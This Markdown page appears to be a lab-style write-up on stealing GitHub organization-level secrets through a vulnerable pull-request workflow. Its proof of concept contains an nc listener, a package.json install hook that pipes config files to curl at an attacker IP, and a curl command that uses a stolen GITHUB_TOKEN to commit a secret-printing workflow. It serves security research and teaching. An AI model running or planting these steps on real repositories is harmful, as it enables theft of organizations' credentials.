# Exfiltration of organization level secrets

It is possible to exfiltrate [organization level secrets](https://docs.github.com/en/actions/security-guides/encrypted-secrets#creating-encrypted-secrets-for-an-organization) even if they are not referenced in the vulnerable repository. However, the access to the secrets should be granted to either all organization repositories (which is the default) or a selected set of repositories including the vulnerable repository.

One way to exfiltrate organization level secrets is to exfiltrate the `GITHUB_TOKEN` and create a new workflow which would reference and print the secrets. This workflow can be created in any branch of the repository. Finally, to actually exfiltrate the secrets one triggers the workflow.

Only organization admins can view the list of organization level secrets. However, it is possible to brute-force the secrets' names by referencing them in the malicious workflow. If a secret doesn't exist, it just prints the empty line. Also, it is possible to grep all public repositories of the organization with the `\${{ *secrets\.[^ ]+ *}}` regex to obtain secrets' names (some of the names might be repository level but others might be organization level).

## Example

### Environment setup

Run [`setup-org-level-secrets.sh`](../scripts/setup-org-level-secrets.sh) as the victim to create the `MYSECRET` organization level secret with the value of `1234567890` and the `org-level-secrets` repository with the vulnerable workflow.

> You'll need [gh](https://github.com/cli/cli) installed to execute the [`setup-org-level-secrets.sh`](../scripts/setup-org-level-secrets.sh) script

### Proof of concept

Perform the following steps as the attacker.

1. Open a publicly accessible port on a remote server (e.g. `nc -vlnk 0.0.0.0 1337`).
1. Fork the `org-level-secrets` repository.
1. Add the `scripts.install` key to the `package.json` file with the `find . -type f -name config | xargs cat | curl --data @- http://{IP}:1337` value replacing the `{IP}` placeholder with the public IP address of the remote server.
1. Open a pull request from the fork to the `org-level-secrets` repository.
1. Wait until the remote server recieves the request and base64-decode the `GITHUB_TOKEN` from it.
1. Run the following command replacing `{GITHUB_TOKEN}` and `{owner}` placeholders with the obtained `GITHUB_TOKEN` and the organization name respectively to create a new workflow.
    ```bash
    curl -X PUT -H "Accept: application/vnd.github.v3+json" -H "Authorization: Bearer {GITHUB_TOKEN}" https://api.github.com/repos/{owner}/org-level-secrets/contents/.github/workflows/exfiltrate.yml -d '{"message":"hey","content":"b246CiAgcHVsbF9yZXF1ZXN0X3RhcmdldDoKam9iczoKICBleGZpbHRyYXRlOgogICAgcnVucy1vbjogdWJ1bnR1LWxhdGVzdAogICAgc3RlcHM6CiAgICAgIC0gbmFtZTogZXhmaWx0cmF0ZQogICAgICAgIHJ1bjogfAogICAgICAgICAgZWNobyAiJHt7IHNlY3JldHMuTVlTRUNSRVQgfX0iIHwgYmFzZTY0IHwgYmFzZTY0"}'
    ```
1. Open another pull request from the to the `org-level-secrets` repository to trigger the workflow.
1. The double-base64-encoded `MYSECRET` secret should appear in workflow run logs.

